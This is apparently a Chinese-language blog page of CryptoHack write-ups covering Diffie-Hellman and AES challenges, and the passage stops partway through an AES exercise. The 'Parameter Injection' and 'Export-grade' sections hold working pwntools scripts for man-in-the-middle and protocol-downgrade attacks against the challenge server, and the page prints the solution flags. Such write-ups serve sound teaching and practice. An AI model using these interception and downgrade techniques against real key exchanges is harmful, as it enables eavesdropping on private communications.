1234567891011121314151617181920212223242526from Crypto.Cipher import AESfrom Crypto.Util.Padding import pad, unpadimport hashlibimport osfrom secret import shared_secretFLAG = b&#x27;crypto&#123;????????????????????????????&#125;&#x27;def encrypt_flag(shared_secret: int): # Derive AES key from shared secret sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode(&#x27;ascii&#x27;)) key = sha1.digest()[:16] # Encrypt flag iv = os.urandom(16) cipher = AES.new(key, AES.MODE_CBC, iv) ciphertext = cipher.encrypt(pad(FLAG, 16)) # Prepare data to send data = &#123;&#125; data[&#x27;iv&#x27;] = iv.hex() data[&#x27;encrypted_flag&#x27;] = ciphertext.hex() return dataprint(encrypt_flag(shared_secret)) 1234567891011121314151617181920212223242526272829303132from Crypto.Cipher import AESfrom Crypto.Util.Padding import pad, unpadimport hashlibdef is_pkcs7_padded(message): padding = message[-message[-1]:] return all(padding[i] == len(padding) for i in range(0, len(padding)))def decrypt_flag(shared_secret: int, iv: str, ciphertext: str): # Derive AES key from shared secret sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode(&#x27;ascii&#x27;)) key = sha1.digest()[:16] # Decrypt flag ciphertext = bytes.fromhex(ciphertext) iv = bytes.fromhex(iv) cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = cipher.decrypt(ciphertext) if is_pkcs7_padded(plaintext): return unpad(plaintext, 16).decode(&#x27;ascii&#x27;) else: return plaintext.decode(&#x27;ascii&#x27;)shared_secret = ?iv = ?ciphertext = ?print(decrypt_flag(shared_secret, iv, ciphertext)) 解1234567891011121314151617181920212223242526272829303132333435363738394041from Crypto.Cipher import AESfrom Crypto.Util.Padding import pad, unpadimport hashlibdef is_pkcs7_padded(message): padding = message[-message[-1]:] return all(padding[i] == len(padding) for i in range(0, len(padding)))def decrypt_flag(shared_secret: int, iv: str, ciphertext: str): # Derive AES key from shared secret sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode(&#x27;ascii&#x27;)) key = sha1.digest()[:16] # Decrypt flag ciphertext = bytes.fromhex(ciphertext) iv = bytes.fromhex(iv) cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = cipher.decrypt(ciphertext) if is_pkcs7_padded(plaintext): return unpad(plaintext, 16).decode(&#x27;ascii&#x27;) else: return plaintext.decode(&#x27;ascii&#x27;)g=2p=2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919A=112218739139542908880564359534373424013016249772931962692237907571990334483528877513809272625610512061159061737608547288558662879685086684299624481742865016924065000555267977830144740364467977206555914781236397216033805882207640219686011643468275165718132888489024688846101943642459655423609111976363316080620471928236879737944217503462265615774774318986375878440978819238346077908864116156831874695817477772477121232820827728424890845769152726027520772901423784b=197395083814907028991785772714920885908249341925650951555219049411298436217190605190824934787336279228785809783531814507661385111220639329358048196339626065676869119737979175531770768861808581110311903548567424039264485661330995221907803300824165469977099494284722831845653985392791480264712091293580274947132480402319812110462641143884577706335859190668240694680261160210609506891842793868297672619625924001403035676872189455767944077542198064499486164431451944B=1241972460522075344783337556660700537760331108332735677863862813666578639518899293226399921252049655031563612905395145236854443334774555982204857895716383215705498970395379526698761468932147200650513626028263449605755661189525521343142979265044068409405667549241125597387173006460145379759986272191990675988873894208956851773331039747840312455221354589910726982819203421992729738296452820365553759182547255998984882158393688119629609067647494762616719047466973581shared_secret = pow(A,b,p)iv = &quot;737561146ff8194f45290f5766ed6aba&quot;ciphertext = &quot;39c99bf2f0c14678d6a5416faef954b5893c316fc3c48622ba1fd6a9fe85f3dc72a29c394cf4bc8aff6a7b21cae8e12c&quot;print(decrypt_flag(shared_secret, iv, ciphertext))# crypto&#123;sh4r1ng_s3cret5_w1th_fr13nd5&#125; Parameter Injection题 解我们会先收到Alice发送的公钥以及参数（p,g,A），可以选择不进行修改将其发送给Bob。而后收到了Bob的公钥B之后我们将其修改为g发送给Alice。这时对A来说，他们的共享密钥为： B^a = g^a = A，是我们已知的，所以最后用其解密收到AES加密后的信息即可。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *import jsonfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpadimport hashlibdef is_pkcs7_padded(message): padding = message[-message[-1]:] return all(p == len(padding) for p in padding)def decrypt_flag(shared_secret: int, iv: str, ciphertext: str): # Derive AES key from shared secret sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode(&#x27;ascii&#x27;)) key = sha1.digest()[:16] # Decrypt flag ciphertext = bytes.fromhex(ciphertext) iv = bytes.fromhex(iv) cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = cipher.decrypt(ciphertext) if is_pkcs7_padded(plaintext): return unpad(plaintext, 16).decode(&#x27;ascii&#x27;) else: return plaintext.decode(&#x27;ascii&#x27;)r = remote(&quot;socket.cryptohack.org&quot;, 13371)alice_raw = r.recvline().decode()# print(alice_raw)# Intercepted from Alice: &#123;&quot;p&quot;: &quot;0xffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca237327ffffffffffffffff&quot;, &quot;g&quot;: &quot;0x02&quot;, &quot;A&quot;: &quot;0x66dfba3758f569f2e8555b078f0ab97cebee5d95e0952156442dad855a6fa4b83f46706864009e5f4a675ac9805a62c98bfdb11257c093f709e665dedce2b5e2d1fac06abc6f20ee542359062a0cbfef4c34e82d1ca6ed7e005d42d1b1101bf17ee19e1dba12cfbb7cd13b2754c224a0e1200f1c28780ee117b8779be01af187a69bbba2bf7429370775cf34611ff93e90b3851d927ae7c41e4a83866ed5df76edb3c9f36fa5fb955887ccec964a773240d7b24df13f5cc0d9ffcc7fc3c9d19d&quot;&#125;alice_data = json.loads(alice_raw.split(&quot;Intercepted from Alice: &quot;)[1])r.sendafter(b&quot;Send to Bob:&quot;, json.dumps(alice_data).encode())# 拦截 Bob 的数据并修改 B=gbob_raw = r.recvline().decode()# print(bob_raw)# Intercepted from Bob: &#123;&quot;B&quot;: &quot;0x4b3506e067f1e4c2cb9a481efe7df6300cc39cfa71e93468afd35d7bdccc95d479f6711672ec1c1c2ca2bc7e69ebc66e548323efebcccb6b6f1cf5e313aecf2b8e31a382481a867fd1f37623ba69224f5d51788df06f4f579f0cc4bc301977ec442332dc370a5e30e701dce36df6cc16b4a9f4f85a39a1ac98431fc3af5726f506f22b7947f2c555af0d2d3135b74ba9d19851c0aac1ab6bc672878edb26a4838593a023ede0074e4e013a33f373406751563cdf6a1a8015345b47d2f4ee67ca&quot;&#125;bob_data = json.loads(bob_raw.split(&quot;Intercepted from Bob: &quot;)[1])bob_data[&#x27;B&#x27;] = alice_data[&#x27;g&#x27;]r.sendafter(b&quot;Send to Alice:&quot;, json.dumps(bob_data).encode())# 接收加密数据final_response = r.recvall()# print(final_response)# b&#x27; Intercepted from Alice: &#123;&quot;iv&quot;: &quot;43650888bb6facc1200aa3ddbf103cb4&quot;, &quot;encrypted_flag&quot;: &quot;4d9ec31387929a23395dd382d0b5fc62b377a4daa95f168d17cdd4c2630a5b69&quot;&#125;\\n&#x27;final_data = json.loads(final_response.decode().split(&quot;Intercepted from Alice: &quot;)[1])iv = final_data[&#x27;iv&#x27;]ciphertext = final_data[&#x27;encrypted_flag&#x27;]shared_secret = int(alice_data[&#x27;A&#x27;], 16)print(decrypt_flag(shared_secret, iv, ciphertext))# crypto&#123;n1c3_0n3_m4ll0ry!!!!!!!!&#125; Export-grade题 与服务器进行交互大概会收到这些内容： 123456789Intercepted from Alice: &#123;&quot;supported&quot;: [&quot;DH1536&quot;, &quot;DH1024&quot;, &quot;DH512&quot;, &quot;DH256&quot;, &quot;DH128&quot;, &quot;DH64&quot;]&#125;Send to Bob:Send to Bob: Intercepted from Bob: &#123;&quot;chosen&quot;: &quot;DH1024&quot;&#125;Send to Alice:Intercepted from Alice: &#123;&quot;p&quot;: &quot;0xde26ab651b92a129&quot;, &quot;g&quot;: &quot;0x2&quot;, &quot;A&quot;: &quot;0xab480cafdb6037a9&quot;&#125;Intercepted from Bob: &#123;&quot;B&quot;: &quot;0x2edc404ff934cbbb&quot;&#125;Intercepted from Alice: &#123;&quot;iv&quot;: &quot;de3c285b773c7f37920800f8292b5604&quot;, &quot;encrypted_flag&quot;: &quot;dfd4221ad3ec8788d6410213adae297b5076179df27885ea0fa9d76ea0748a32&quot;&#125; 解我们需要做的就是拦截选择算法的那一步，让他们选择DH64，这样就可以直接用sympy库的discrete_log计算出密钥。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *import jsonimport refrom hashlib import sha1from Crypto.Cipher import AESfrom sympy import discrete_log# 将消息中的JSON部分提取出来def recv_until_jsons(raw_data: str): json_objects = re.findall(r&#x27;\\&#123;.*?\\&#125;&#x27;, raw_data) parsed = [] for js in json_objects: try: parsed.append(json.loads(js)) except json.JSONDecodeError: continue return parsedr = remote(&quot;socket.cryptohack.org&quot;, 13379)line = r.recvline().decode().strip()json_str = re.search(r&#x27;\\&#123;.*\\&#125;&#x27;, line).group()msg = json.loads(json_str)msg[&#x27;supported&#x27;] = [&quot;DH64&quot;]r.sendline(json.dumps(msg).encode())line = r.recvline().decode().strip()json_str = re.search(r&#x27;\\&#123;.*\\&#125;&#x27;, line).group()r.sendline(json_str.encode())data = r.recvall().decode()params = &#123;&#125;for obj in recv_until_jsons(data): if &#x27;p&#x27; in obj and &#x27;g&#x27; in obj and &#x27;A&#x27; in obj: params[&#x27;p&#x27;] = int(obj[&#x27;p&#x27;], 16) params[&#x27;g&#x27;] = int(obj[&#x27;g&#x27;], 16) params[&#x27;A&#x27;] = int(obj[&#x27;A&#x27;], 16) elif &#x27;B&#x27; in obj: params[&#x27;B&#x27;] = int(obj[&#x27;B&#x27;], 16) elif &#x27;iv&#x27; in obj and &#x27;encrypted_flag&#x27; in obj: params[&#x27;iv&#x27;] = bytes.fromhex(obj[&#x27;iv&#x27;]) params[&#x27;ct&#x27;] = bytes.fromhex(obj[&#x27;encrypted_flag&#x27;])# === 计算私钥 a, 共享密钥 s, 派生 AES 密钥并解密 ===p, g, A, B = params[&#x27;p&#x27;], params[&#x27;g&#x27;], params[&#x27;A&#x27;], params[&#x27;B&#x27;]iv, ct = params[&#x27;iv&#x27;], params[&#x27;ct&#x27;]a = discrete_log(p, A, g)s = pow(B, a, p)key = sha1(str(s).encode()).digest()[:16]pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)print(pt.decode())# crypto&#123;d0wn6r4d35_4r3_d4n63r0u5&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Crypto/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/en/tags/Crypto/"},{"name":"Cryptohack","slug":"Cryptohack","permalink":"https://archer-baiyi.github.io/en/tags/Cryptohack/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"}]},{"title":"Cyptohack Symmetric_Cryptography Writeup","slug":"CTF/Crypto/Cyptohack-Symmetric-Cryptography-Writeup","date":"2025-06-02T20:37:53.000Z","updated":"2025-06-02T22:26:06.396Z","comments":true,"path":"2025/06/02/CTF/Crypto/Cyptohack-Symmetric-Cryptography-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/06/02/CTF/Crypto/Cyptohack-Symmetric-Cryptography-Writeup/","excerpt":"","text":"Keyed Permutations题 解这种叫Bijection。 1crypto&#123;bijection&#125; Resisting Bruteforce题 解根据图片中的描述，题目询问的是：“What is the name for the best single-key attack against AES?” 在描述中提到了： AES 的安全性 一个攻击能将 AES-128 的安全性降低到约 126.1 bits 这种攻击自 8 年前提出后未见改进 最后提到了量子计算机的 Grover 算法，但题目关注的是单密钥攻击 结合这些信息，这里的关键是 AES 最知名的单密钥攻击：“biclique attack”。 biclique 攻击是目前对 AES 最好的单密钥攻击，虽然它只降低了安全级别很小一部分，并且不构成现实威胁，但在学术界中，它是对 AES 的已知最佳攻击。 1crypto&#123;biclique&#125; Structure of AES题 12345678910111213141516def bytes2matrix(text): &quot;&quot;&quot; Converts a 16-byte array into a 4x4 matrix. &quot;&quot;&quot; return [list(text[i:i+4]) for i in range(0, len(text), 4)]def matrix2bytes(matrix): &quot;&quot;&quot; Converts a 4x4 matrix into a 16-byte array. &quot;&quot;&quot; ????matrix = [ [99, 114, 121, 112], [116, 111, 123, 105], [110, 109, 97, 116], [114, 105, 120, 125],]print(matrix2bytes(matrix)) 解1234567891011121314151617def bytes2matrix(text): &quot;&quot;&quot; Converts a 16-byte array into a 4x4 matrix. &quot;&quot;&quot; return [list(text[i:i+4]) for i in range(0, len(text), 4)]def matrix2bytes(matrix): &quot;&quot;&quot; Converts a 4x4 matrix into a 16-byte array. &quot;&quot;&quot; return bytes(sum(matrix, []))matrix = [ [99, 114, 121, 112], [116, 111, 123, 105], [110, 109, 97, 116], [114, 105, 120, 125],]print(matrix2bytes(matrix))# b&#x27;crypto&#123;inmatrix&#125;&#x27; Round Keys题 1234567891011121314151617181920state = [ [206, 243, 61, 34], [171, 11, 93, 31], [16, 200, 91, 108], [150, 3, 194, 51],]round_key = [ [173, 129, 68, 82], [223, 100, 38, 109], [32, 189, 53, 8], [253, 48, 187, 78],]def add_round_key(s, k): ???print(add_round_key(state, round_key)) 解123456789101112131415161718192021222324state = [ [206, 243, 61, 34], [171, 11, 93, 31], [16, 200, 91, 108], [150, 3, 194, 51],]round_key = [ [173, 129, 68, 82], [223, 100, 38, 109], [32, 189, 53, 8], [253, 48, 187, 78],]def add_round_key(s, k): return [[s[i][j] ^ k[i][j] for j in range(4)] for i in range(4)]def matrix2bytes(matrix): &quot;&quot;&quot; Converts a 4x4 matrix into a 16-byte array. &quot;&quot;&quot; return bytes(sum(matrix, []))print(matrix2bytes(add_round_key(state, round_key)))# b&#x27;crypto&#123;r0undk3y&#125;&#x27; Confusion through Substitution题 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051s_box = ( 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,)inv_s_box = ( 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D,)state = [ [251, 64, 182, 81], [146, 168, 33, 80], [199, 159, 195, 24], [64, 80, 182, 255],]def sub_bytes(s, sbox=s_box): ???print(sub_bytes(state, sbox=inv_s_box)) 解12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455s_box = ( 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,)inv_s_box = ( 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D,)state = [ [251, 64, 182, 81], [146, 168, 33, 80], [199, 159, 195, 24], [64, 80, 182, 255],]def sub_bytes(s, sbox=s_box): return [[sbox[byte] for byte in row] for row in s]def matrix2bytes(matrix): &quot;&quot;&quot; Converts a 4x4 matrix into a 16-byte array. &quot;&quot;&quot; return bytes(sum(matrix, []))print(matrix2bytes(sub_bytes(state, sbox=inv_s_box)))# b&#x27;crypto&#123;l1n34rly&#125;&#x27; Diffusion through Permutation题 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950def shift_rows(s): s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3]def inv_shift_rows(s): ???# learned from http://cs.ucsb.edu/~koc/cs178/projects/JT/aes.cxtime = lambda a: (((a &lt;&lt; 1) ^ 0x1B) &amp; 0xFF) if (a &amp; 0x80) else (a &lt;&lt; 1)def mix_single_column(a): # see Sec 4.1.2 in The Design of Rijndael t = a[0] ^ a[1] ^ a[2] ^ a[3] u = a[0] a[0] ^= t ^ xtime(a[0] ^ a[1]) a[1] ^= t ^ xtime(a[1] ^ a[2]) a[2] ^= t ^ xtime(a[2] ^ a[3]) a[3] ^= t ^ xtime(a[3] ^ u)def mix_columns(s): for i in range(4): mix_single_column(s[i])def inv_mix_columns(s): # see Sec 4.1.3 in The Design of Rijndael for i in range(4): u = xtime(xtime(s[i][0] ^ s[i][2])) v = xtime(xtime(s[i][1] ^ s[i][3])) s[i][0] ^= u s[i][1] ^= v s[i][2] ^= u s[i][3] ^= v mix_columns(s)state = [ [108, 106, 71, 86], [96, 62, 38, 72], [42, 184, 92, 209], [94, 79, 8, 54],] 解注意，这里的inv_mix_columns()和inv_shift_rows()都是没有输出的，所以只能直接调用。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859def shift_rows(s): s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3]def inv_shift_rows(s): s[0][1], s[1][1], s[2][1], s[3][1] = s[3][1], s[0][1], s[1][1], s[2][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[1][3], s[2][3], s[3][3], s[0][3]# learned from http://cs.ucsb.edu/~koc/cs178/projects/JT/aes.cxtime = lambda a: (((a &lt;&lt; 1) ^ 0x1B) &amp; 0xFF) if (a &amp; 0x80) else (a &lt;&lt; 1)def mix_single_column(a): # see Sec 4.1.2 in The Design of Rijndael t = a[0] ^ a[1] ^ a[2] ^ a[3] u = a[0] a[0] ^= t ^ xtime(a[0] ^ a[1]) a[1] ^= t ^ xtime(a[1] ^ a[2]) a[2] ^= t ^ xtime(a[2] ^ a[3]) a[3] ^= t ^ xtime(a[3] ^ u)def mix_columns(s): for i in range(4): mix_single_column(s[i])def inv_mix_columns(s): # see Sec 4.1.3 in The Design of Rijndael for i in range(4): u = xtime(xtime(s[i][0] ^ s[i][2])) v = xtime(xtime(s[i][1] ^ s[i][3])) s[i][0] ^= u 